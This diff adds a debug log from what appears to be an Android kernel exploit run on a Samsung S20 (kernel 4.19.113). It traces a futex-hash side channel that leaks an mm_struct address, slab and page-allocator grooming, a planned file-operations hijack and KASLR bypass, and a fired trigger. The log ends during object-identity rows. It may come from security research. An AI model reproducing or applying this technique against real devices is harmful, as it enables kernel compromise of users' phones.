@@ -1,0 +1,466 @@
+=== run 2026-11-03T17:37:50-06:00 budget=1800s fresh=0 env=KS_PLANT_ALL=1 KS_PAGE_PROBE=1
+bootreason_before=kernel_panic,null
+-rw-rw-rw- 1 shell shell  0 2026-11-03 10:50 /data/local/tmp/ghostlock_ks_cache.txt
+-rw-rw-rw- 1 shell shell 22 2026-11-03 17:35 /data/local/tmp/ks_mm_answer.txt
+/home/ubuntu/S20-SM-G986U1/build/samsung-g986u1-4.19.113/bin/preload.so: 1 file pushed, 0 skipped. 48.6 MB/s (279032 bytes in 0.005s)
+--- payload start 2026-11-03T17:37:51-06:00
+[+] exlog open path=/data/local/tmp/ks_log.txt pid=10982 uid=2000
+[+] preload starting pid=10982 log=/data/local/tmp/ks_log.txt
+[+] startup context pid=10982 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=10982 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=10982 label=samsung_g986u1_4.19.113 slide=pselect main=pselect
+[+] p0 profile pid=10982 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffffc002c25ea8 bootid_data=ffffffc000080000 init_task=ffffffc002c2f9c0 root_tg=ffffffc003211c00 sysctl_bootid=ffffffc0033adcec
+[*] slide skipped; KASLR via configfs scan after fops hijack
+[*] KS_SURFACE geometry=measured objsize=1024 objs_per_slab=32 pages_per_slab=8 span=32768 span_src=derived(measured-pagesperslab*page) span_agrees=1 assumed_objs_per_slab=32 assumed_span=32768 assumes_agree=1 sysfs=denied errno=13 per_object_address=unavailable reason=one-leak-one-address geometry=1024/32/8/32768
+[*] MMSLAB baseline mm_struct            873   1088   1024   32    8 : tunables    0    0    0 : slabdata     34     34      0
+[*] SLABPAGES baseline Slab:             475808 kB
+[*] memory detected ram=0x2c0000000 (11 GB) window_end=ffffffc2c0000000
+[*] KS_COST reps=128 mult=4 pile2_baseline=1
+[*] parameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] futex_init hashsize=0x800 (cpus=8)
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->70 active=2240->2240 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=70->71 active=2240->2272 da=32 ds=1 cls=new
+[*] KS_LEAK child pid=12579 (forked mm target)
+[*] target    00000077c441f0e0
+[*] KS_PRE lead=22 fillers=32 leak_slot=1 slabs=70->71
+[*] KS_BURST slots=32 boundary_slabs=71 after_slabs=71 span_ok=1 expect=32 plan_cpu=1
+[*] KS_BUDDY_CAPTURE tries=53 sends=53 errno=0 sndbuf=16777216 cpu=0
+[*] KS_SLOT tag=control i=0 slabs=71->72 active=2272->2304 da=32 ds=1 cls=new
+[*] KS_SLOT tag=control i=1 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=2 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=3 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=4 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=5 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=6 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=7 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=8 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=9 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=10 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=11 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=12 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=13 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=14 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=15 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=16 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=17 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=18 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=19 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=20 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=21 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=22 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=23 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=24 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=25 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=26 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=27 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=28 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=29 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=30 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=31 slabs=72->72 active=2304->2304 da=0 ds=0 cls=same
+[*] KS_CONTROL slots=32 boundary_slabs=72 after_slabs=72 span_ok=1 expect=32 last_pid=12644
+[*] start finding collisisons
+[*] collision threshold approx=20 thr=100
+[*]   000000748e1ab850 (before=20 after=6662)
+[*]   000000748ef88738 (before=20 after=6659)
+[*]   000000748f00bb50 (before=20 after=6667)
+[*]   000000748f592788 (before=20 after=6661)
+[*]   000000748f5e09f8 (before=20 after=6663)
+[*]   000000748fc66e28 (before=20 after=6660)
+[*]   000000749013b4d0 (before=20 after=6668)
+[*]   0000007491850d78 (before=20 after=6662)
+[*]   0000007491bf4a98 (before=20 after=6668)
+[*]   00000074922c9140 (before=20 after=6662)
+[*]   0000007493632c88 (before=20 after=6663)
+[*]   0000007493704318 (before=20 after=6665)
+[*]   000000749473f4f0 (before=20 after=6663)
+[*]   00000074949c08f8 (before=20 after=6666)
+[*]   000000749551b3d0 (before=20 after=6662)
+[*]   0000007495a2cc58 (before=20 after=6662)
+[*]   0000007495a62e08 (before=20 after=6660)
+[*]   00000074969d79b0 (before=20 after=6662)
+[*]   0000007496ced260 (before=20 after=6682)
+[*]   0000007496f6e668 (before=20 after=6676)
+[*]   000000749718f770 (before=20 after=6663)
+[*]   00000074979565a8 (before=20 after=6665)
+[*]   0000007497e23c10 (before=20 after=6662)
+[*]   0000007497f28438 (before=20 after=6666)
+[*]   0000007499081f00 (before=20 after=6662)
+[*]   00000074990c3110 (before=20 after=6661)
+[*]   0000007499961600 (before=20 after=6664)
+[*]   0000007499bfbad0 (before=20 after=6659)
+[*]   0000007499cdf1f0 (before=20 after=6661)
+[*]   000000749b0df1f0 (before=20 after=6664)
+[*]   000000749bc38cb8 (before=20 after=6662)
+[*]   000000749bc46d28 (before=20 after=6665)
+[*]   000000749d84ed68 (before=20 after=6661)
+[*]   000000749d866e28 (before=20 after=6663)
+[*]   000000749ed5e5e8 (before=20 after=6661)
+[*]   000000749f044d18 (before=20 after=6664)
+[*]   000000749ff9d7e0 (before=20 after=6664)
+[*]   00000074a0390778 (before=20 after=6662)
+[*]   00000074a1652d88 (before=20 after=6662)
+[*]   00000074a4240cf8 (before=20 after=6663)
+[*]   00000074a4f6a648 (before=20 after=6661)
+[*]   00000074a65977b0 (before=20 after=6662)
+[*]   00000074a69da9c8 (before=20 after=6662)
+[*]   00000074a7209b40 (before=20 after=6665)
+[*]   00000074a82f72b0 (before=20 after=6666)
+[*]   00000074a9b04318 (before=20 after=6664)
+[*]   00000074aa751580 (before=20 after=6664)
+[*]   00000074aaa04b18 (before=20 after=6663)
+[*]   00000074abd9f7f0 (before=20 after=6665)
+[*]   00000074ad39b7d0 (before=20 after=6662)
+[*]   00000074ad5c08f8 (before=20 after=6661)
+[*]   00000074ad65ede8 (before=20 after=6663)
+[*]   00000074ae224c18 (before=20 after=6660)
+[*]   00000074ae77e6e8 (before=20 after=6661)
+[*]   00000074ae894f98 (before=20 after=6665)
+[*]   00000074af5d4998 (before=20 after=6661)
+[*]   00000074afc9dfe0 (before=20 after=6663)
+[*]   00000074b0224c18 (before=20 after=6661)
+[*]   00000074b0857db0 (before=20 after=6661)
+[*]   00000074b09e8a38 (before=20 after=6666)
+[*]   00000074b120db60 (before=20 after=6664)
+[*]   00000074b1441d00 (before=20 after=5585)
+[*]   00000074b1cfc2d8 (before=21 after=6661)
+[*]   00000074b1df5aa0 (before=20 after=6662)
+[*]   00000074b332a448 (before=20 after=6663)
+[*]   00000074b34f52a0 (before=20 after=6662)
+[*]   00000074b3c37cb0 (before=20 after=6661)
+[*]   00000074b47dc9d8 (before=20 after=6663)
+[*]   00000074b4fb58a0 (before=20 after=6661)
+[*]   00000074b5f91780 (before=20 after=6661)
+[*]   00000074b65364a8 (before=20 after=6661)
+[*]   00000074b692c458 (before=20 after=6663)
+[*]   00000074b7276ea8 (before=20 after=6664)
+[*]   00000074b85766a8 (before=20 after=6662)
+[*]   00000074b8c36ca8 (before=20 after=6663)
+[*]   00000074b8e3dce0 (before=20 after=6660)
+[*]   00000074b8f2c458 (before=20 after=6659)
+[*]   00000074bac42d08 (before=20 after=6662)
+[*]   00000074bb4b90c0 (before=20 after=6661)
+[*]   00000074bb7de9e8 (before=20 after=6662)
+[*]   00000074bcd7c6d8 (before=20 after=6661)
+[*]   00000074bd46de60 (before=20 after=6660)
+[*]   00000074bdffdae0 (before=20 after=6663)
+[*]   00000074be215ba0 (before=20 after=6662)
+[*]   00000074be9d0978 (before=20 after=6670)
+[*]   00000074bed30478 (before=20 after=6662)
+[*]   00000074bf0b0078 (before=20 after=6662)
+[*]   00000074bf8d1180 (before=20 after=6661)
+[*]   00000074bfa61e00 (before=20 after=6664)
+[*]   00000074bfb28438 (before=20 after=6661)
+[*]   00000074bfbab850 (before=20 after=6662)
+[*]   00000074c0fe4a18 (before=20 after=6662)
+[*]   00000074c1855da0 (before=20 after=6663)
+[*]   00000074c1878eb8 (before=20 after=6664)
+[*]   00000074c191b3d0 (before=20 after=6664)
+[*]   00000074c20ac058 (before=20 after=6664)
+[*]   00000074c22be0e8 (before=20 after=6662)
+[*]   00000074c3a71e80 (before=20 after=5542)
+[*]   00000074c41f2a88 (before=20 after=6662)
+[*]   00000074c49c08f8 (before=20 after=6658)
+[*]   00000074c49c3910 (before=20 after=6664)
+[*]   00000074c4af1280 (before=20 after=6669)
+[*]   00000074c6089f40 (before=20 after=6660)
+[*]   00000074c652f470 (before=20 after=6663)
+[*]   00000074c738f770 (before=20 after=6664)
+[*]   00000074c79374b0 (before=20 after=6664)
+[*]   00000074c7d7a6c8 (before=20 after=6670)
+[*]   00000074c855e5e8 (before=20 after=6661)
+[*]   00000074c86d71b0 (before=20 after=6662)
+[*]   00000074c8d10378 (before=20 after=6663)
+[*]   00000074ca19c7d8 (before=20 after=6661)
+[*]   00000074ca213b90 (before=20 after=6664)
+[*]   00000074cbcb3090 (before=20 after=6661)
+[*]   00000074cbcc1100 (before=20 after=6664)
+[*]   00000074cc0e9240 (before=20 after=6663)
+[*]   00000074cc247d30 (before=20 after=6661)
+[*]   00000074cc330478 (before=20 after=6663)
+[*]   00000074ccf53590 (before=20 after=6662)
+[*]   00000074cd481f00 (before=20 after=6665)
+[*] pile2 anchor id=1091664 addr=000000748e1ab850 align=0 value=0
+[*] start second pile id=1091664 addr=000000748e1ab850
+[*]   pile2 000000748e1ab850 (before=20 after=218)
+[*]   pile2 000000748ef88738 (before=20 after=6762)
+[*]   pile2 000000748f00bb50 (before=20 after=6763)
+[*]   pile2 000000748f592788 (before=20 after=6761)
+[*]   pile2 000000748f5e09f8 (before=20 after=6770)
+[*]   pile2 000000748fc66e28 (before=20 after=5658)
+[*]   pile2 000000749013b4d0 (before=20 after=6760)
+[*]   pile2 0000007491850d78 (before=20 after=6761)
+[*]   pile2 0000007491bf4a98 (before=20 after=6762)
+[*]   pile2 00000074922c9140 (before=20 after=6761)
+[*]   pile2 0000007493632c88 (before=20 after=6776)
+[*]   pile2 0000007493704318 (before=20 after=6763)
+[*]   pile2 000000749473f4f0 (before=20 after=6760)
+[*]   pile2 00000074949c08f8 (before=20 after=6761)
+[*]   pile2 000000749551b3d0 (before=20 after=6761)
+[*]   pile2 0000007495a2cc58 (before=20 after=6763)
+[*]   pile2 0000007495a62e08 (before=20 after=6765)
+[*]   pile2 00000074969d79b0 (before=20 after=5621)
+[*]   pile2 0000007496ced260 (before=20 after=6761)
+[*]   pile2 0000007496f6e668 (before=20 after=6761)
+[*]   pile2 000000749718f770 (before=20 after=6762)
+[*]   pile2 00000074979565a8 (before=20 after=6762)
+[*]   pile2 0000007497e23c10 (before=20 after=6760)
+[*]   pile2 0000007497f28438 (before=20 after=6761)
+[*]   pile2 0000007499081f00 (before=20 after=6762)
+[*]   pile2 00000074990c3110 (before=20 after=6762)
+[*]   pile2 0000007499961600 (before=20 after=6761)
+[*]   pile2 0000007499bfbad0 (before=20 after=6764)
+[*]   pile2 0000007499cdf1f0 (before=20 after=6764)
+[*]   pile2 000000749b0df1f0 (before=20 after=6771)
+[*]   pile2 000000749bc38cb8 (before=20 after=6760)
+[*]   pile2 000000749bc46d28 (before=20 after=6760)
+[*]   pile2 000000749d84ed68 (before=20 after=6761)
+[*]   pile2 000000749d866e28 (before=20 after=6761)
+[*]   pile2 000000749ed5e5e8 (before=20 after=6760)
+[*]   pile2 000000749f044d18 (before=20 after=6761)
+[*]   pile2 000000749ff9d7e0 (before=20 after=6765)
+[*]   pile2 00000074a0390778 (before=20 after=6764)
+[*]   pile2 00000074a1652d88 (before=20 after=6768)
+[*]   pile2 00000074a4240cf8 (before=20 after=6760)
+[*]   pile2 00000074a4f6a648 (before=20 after=6764)
+[*]   pile2 00000074a65977b0 (before=20 after=6767)
+[*]   pile2 00000074a69da9c8 (before=20 after=6761)
+[*]   pile2 00000074a7209b40 (before=20 after=6760)
+[*]   pile2 00000074a82f72b0 (before=20 after=6759)
+[*]   pile2 00000074a9b04318 (before=20 after=6760)
+[*]   pile2 00000074aa751580 (before=20 after=6760)
+[*]   pile2 00000074aaa04b18 (before=20 after=6777)
+[*]   pile2 00000074abd9f7f0 (before=20 after=6763)
+[*]   pile2 00000074ad39b7d0 (before=20 after=5564)
+[*]   pile2 00000074ad5c08f8 (before=20 after=6763)
+[*]   pile2 00000074ad65ede8 (before=20 after=6761)
+[*]   pile2 00000074ae224c18 (before=20 after=6760)
+[*]   pile2 00000074ae77e6e8 (before=20 after=6759)
+[*]   pile2 00000074ae894f98 (before=20 after=6762)
+[*]   pile2 00000074af5d4998 (before=20 after=6771)
+[*]   pile2 00000074afc9dfe0 (before=20 after=6758)
+[*]   pile2 00000074b0224c18 (before=20 after=6763)
+[*]   pile2 00000074b0857db0 (before=20 after=6762)
+[*]   pile2 00000074b09e8a38 (before=20 after=6763)
+[*]   pile2 00000074b120db60 (before=20 after=6760)
+[*]   pile2 00000074b1441d00 (before=20 after=6762)
+[*]   pile2 00000074b1cfc2d8 (before=20 after=6761)
+[*]   pile2 00000074b1df5aa0 (before=20 after=6761)
+[*]   pile2 00000074b332a448 (before=20 after=6761)
+[*]   pile2 00000074b34f52a0 (before=20 after=6762)
+[*]   pile2 00000074b3c37cb0 (before=20 after=6759)
+[*]   pile2 00000074b47dc9d8 (before=20 after=6761)
+[*]   pile2 00000074b4fb58a0 (before=20 after=6777)
+[*]   pile2 00000074b5f91780 (before=20 after=6761)
+[*]   pile2 00000074b65364a8 (before=20 after=6761)
+[*]   pile2 00000074b692c458 (before=20 after=6770)
+[*]   pile2 00000074b7276ea8 (before=20 after=6758)
+[*]   pile2 00000074b85766a8 (before=20 after=6760)
+[*]   pile2 00000074b8c36ca8 (before=20 after=6762)
+[*]   pile2 00000074b8e3dce0 (before=20 after=6774)
+[*]   pile2 00000074b8f2c458 (before=20 after=6764)
+[*]   pile2 00000074bac42d08 (before=20 after=6775)
+[*]   pile2 00000074bb4b90c0 (before=20 after=6759)
+[*]   pile2 00000074bb7de9e8 (before=20 after=6759)
+[*]   pile2 00000074bcd7c6d8 (before=20 after=6761)
+[*]   pile2 00000074bd46de60 (before=20 after=6761)
+[*]   pile2 00000074bdffdae0 (before=20 after=6762)
+[*]   pile2 00000074be215ba0 (before=20 after=6769)
+[*]   pile2 00000074be9d0978 (before=20 after=6762)
+[*]   pile2 00000074bed30478 (before=20 after=6760)
+[*]   pile2 00000074bf0b0078 (before=20 after=6762)
+[*]   pile2 00000074bf8d1180 (before=20 after=6762)
+[*]   pile2 00000074bfa61e00 (before=20 after=6763)
+[*]   pile2 00000074bfb28438 (before=20 after=6778)
+[*]   pile2 00000074bfbab850 (before=20 after=6765)
+[*]   pile2 00000074c0fe4a18 (before=20 after=6761)
+[*]   pile2 00000074c1855da0 (before=20 after=6757)
+[*]   pile2 00000074c1878eb8 (before=20 after=6763)
+[*]   pile2 00000074c191b3d0 (before=20 after=6761)
+[*]   pile2 00000074c20ac058 (before=20 after=6761)
+[*]   pile2 00000074c22be0e8 (before=20 after=6761)
+[*]   pile2 00000074c3a71e80 (before=20 after=6774)
+[*]   pile2 00000074c41f2a88 (before=20 after=6763)
+[*]   pile2 00000074c49c08f8 (before=20 after=6761)
+[*]   pile2 00000074c49c3910 (before=20 after=6762)
+[*]   pile2 00000074c4af1280 (before=20 after=5642)
+[*]   pile2 00000074c6089f40 (before=20 after=6760)
+[*]   pile2 00000074c652f470 (before=20 after=6760)
+[*]   pile2 00000074c738f770 (before=20 after=6761)
+[*]   pile2 00000074c79374b0 (before=20 after=6761)
+[*]   pile2 00000074c7d7a6c8 (before=21 after=6764)
+[*]   pile2 00000074c855e5e8 (before=22 after=6765)
+[*]   pile2 00000074c86d71b0 (before=21 after=6762)
+[*]   pile2 00000074c8d10378 (before=21 after=6762)
+[*]   pile2 00000074ca19c7d8 (before=21 after=6762)
+[*]   pile2 00000074ca213b90 (before=21 after=6763)
+[*]   pile2 00000074cbcb3090 (before=22 after=6765)
+[*]   pile2 00000074cbcc1100 (before=21 after=6761)
+[*]   pile2 00000074cc0e9240 (before=21 after=6767)
+[*]   pile2 00000074cc247d30 (before=22 after=6764)
+[*]   pile2 00000074cc330478 (before=21 after=6761)
+[*]   pile2 00000074ccf53590 (before=21 after=6760)
+[*]   pile2 00000074cd481f00 (before=21 after=6761)
+[*] found 16 accepted collisions (pile1=119 pile2=119)
+[*] KS_PC export path=/data/local/tmp/ks_collisions.txt accepted=16 candidates=119/119 hashsize=0x800
+[*] KS_PC waiting up to 60s poll_ms=1000 for /data/local/tmp/ks_mm_answer.txt
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[*] KS_CACHE hit path=/data/local/tmp/ks_cache.txt anchor=ffffffc1aeae8400 start=ffffffc000000000 end=ffffffc2c0000000 radius=8GB
+[*] start bruteforcing
+[*] [  1] start finding mm_struct [ffffffc040000000-ffffffc0c0000000]
+[*] [  3] start finding mm_struct [ffffffc100000000-ffffffc180000000]
+[*] [  2] start finding mm_struct [ffffffc080000000-ffffffc140000000]
+[*] [  5] start finding mm_struct [ffffffc180000000-ffffffc240000000]
+[*] [  4] start finding mm_struct [ffffffc140000000-ffffffc1c0000000]
+[*] [  6] start finding mm_struct [ffffffc200000000-ffffffc280000000]
+[*] [  0] start finding mm_struct [ffffffc000000000-ffffffc080000000]
+[*] [  7] start finding mm_struct [ffffffc240000000-ffffffc2c0000000]
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1aeae8400 addr=000000748e1ab850 i=1
+[*] CANDIDATE mm=ffffffc255930400 need=15
+[*] bruteforce dbg_any_match=23296 (candidates where >=2 addrs shared bucket)
+[*] KernelSnitch mm found addr=ffffffc255930400 sz=0x400
+[*] KS_CACHE save path=/data/local/tmp/ks_cache.txt anchor=ffffffc255930400
+[*] KS_TARGET_CHILD_CPU pid=12579 cpu=0
+[*] KS_LEAK child pid=12579 done state=4
+[*] KS_TIME leak_ms=517197
+[*] MMSLAB pre-saturate mm_struct           2336   2336   1024   32    8 : tunables    0    0    0 : slabdata     73     73      0
+[*] SLABPAGES pre-saturate Slab:             566844 kB
+[*] KS_PARTIAL slabs=16 kept=64
+[*] MMSLAB post-saturate mm_struct           1953   2336   1024   32    8 : tunables    0    0    0 : slabdata     73     73      0
+[*] SLABPAGES post-saturate Slab:             544716 kB
+[*] KS_BUDDY_FILL bytes=36480 errno=0
+[*] MMSLAB post-target mm_struct           1953   2336   1024   32    8 : tunables    0    0    0 : slabdata     73     73      0
+[*] SLABPAGES post-target Slab:             544716 kB
+[*] KS_DELTA delta=0 default (mm offset=0000000255930400)
+[*] KS_TIME page_prep_ms=517607
+[*] KSLAB_BASE_CANDIDATE mm=ffffffc255930400 base=ffffffc255930000 idx=0
+[*] KS_ID_WINDOW window=f0cf5e9a-26855883 boot=f0cf5e9a opened_mono_ms=26855883 slots=32 scope=cycle window_src=measured(boot_id,clock_monotonic)
+[*] KS_OBJ_ID window=f0cf5e9a-26855883 addr=ffffffc255930400 addr_src=measured(leak) addr_unique=unique geom=1024/32/8/32768 geom_src=measured(slabinfo) page=ffffffc255930000 page_src=derived(measured-span=32768) offset=1024 slot=1 slot_src=derived constructed_slot=1 match=1 page_identity=exact
+[*] KS_LEAK_TARGET mm=ffffffc255930400 prio_read=ffffffc255930400
+[*] KS_PAGE_PROBE base=ffffffc255930000 read_at=ffffffc255930018 blob_off=e98
+[*] KS_PUNCH_DUMP intent tag=intent base=ffffffc255930000 lock=ffffffc255931350 w0=ffffffc255932220 task=ffffffc255933200 fops=ffffffc255931000 bias=e80 rb_root=ffffffc255932220 leftmost=ffffffc255932220 owner=ffffffc255933201 w0_lock=ffffffc255931350 blocked=ffffffc255932220
+[*] MMSLAB post-release mm_struct           1953   2336   1024   32    8 : tunables    0    0    0 : slabdata     73     73      0
+[*] SLABPAGES post-release Slab:             544464 kB
+[*] KS_DRAIN_LIMIT cpu_partial=6 drain_slabs=8 pre_slabs=16 slabs=24
+[*] KS_TRIGGER prepared slabs=24 refs=768 cpu=0
+[*] MMSLAB pre-spray mm_struct           2656   2656   1024   32    8 : tunables    0    0    0 : slabdata     83     83      0
+[*] SLABPAGES pre-spray Slab:             583296 kB
+[*] MMSLAB sweep n=1024/32/32/512 live=1024/0/0/0 closed=1024/0/0/0 killed=1024/0/0/0 mm_struct           1798   2080   1024   32    8 : tunables    0    0    0 : slabdata     65     65      0
+[*] SLABPAGES sweep n=1024/32/32/512 live=1024/0/0/0 closed=1024/0/0/0 killed=1024/0/0/0 Slab:             523960 kB
+[*] MMSLAB post-sweep mm_struct           1798   2080   1024   32    8 : tunables    0    0    0 : slabdata     65     65      0
+[*] SLABPAGES post-sweep Slab:             523960 kB
+[*] KS_TRIGGER fired slabs=16 cpu=0
+[*] KS_TARGET base=ffffffc255930000 mm=ffffffc255930400 pinned=1
+[*] MMSLAB post-spray-kill mm_struct           1616   1984   1024   32    8 : tunables    0    0    0 : slabdata     62     62      0
+[*] SLABPAGES post-spray-kill Slab:             519940 kB
+[*] SLAB32 post-spray-kill absent
+[*] KS_BUDDY_HOLD blocks=8 cpu=0
+[*] KS_NEIGHBOR_HOLD blocks=8 base=ffffffc255930000 buddy=ffffffc255938000 scope=order3-page
+[*] KS_BUDDY_HELD base=ffffffc255930000 buddy=ffffffc255938000 held_order3_blocks=8 neighbour_children=64 sibling=unmeasured reason=pagemap-pfn-needs-CAP_SYS_ADMIN
+[*] MMSLAB post-isolate mm_struct           1616   1984   1024   32    8 : tunables    0    0    0 : slabdata     62     62      0
+[*] SLABPAGES post-isolate Slab:             519036 kB
+[*] KS_TARGET_TGID pre=1 pid=12612
+[*] KS_TARGET memfds_closed=0 memfd=none base=ffffffc255930000 cpu=0
+[*] KS_HEAD_WARM bytes=3712 want=3712 errno=0
+[*] KS_HEAD_DRAIN bytes=3712 want=3712 errno=0
+[*] KS_SLAB_ALIVE slots=32 alive=31 zombie=0 gone=0 target=S exclusive=1
+[*] KS_SLAB_OWNERS slots=32 fillers=31 target=1 total=32 post_ctx=32 lead_ctx=22 cpu=0
+[*] KS_PIN group=pre fillers=31 ready=0 cpu0=31 other=0 ok=1
+[*] KS_PIN group=control fillers=31 ready=0 cpu0=31 other=0 ok=1
+[*] KS_CONTROL_PINNED fillers=31 kept_pid=12644 cpu=0 empty_cpu=1
+[*] KS_SEEDER pid=24799 slots=32 ready=1 forked=33 cpu=1 parent_cpu=0 empty_cpu=1
+[*] KS_FREEZER children=1024 pages=32 free_before=368 active=1616 num=1984 slabs=62 cpu=0
+[*] KS_PREDRAIN pushes=64 drop=0 cpu=0
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=0 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=1 role=scan allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=ffffffc255930400 addr_src=measured(leak) addr_unique=unique geom=1024/32/8/32768 page=ffffffc255930000 page_src=derived(measured-span=32768) offset=1024 slot_in_page=1 slot_src=derived constructed_slot=1 match=1 page_identity=exact d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=2 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
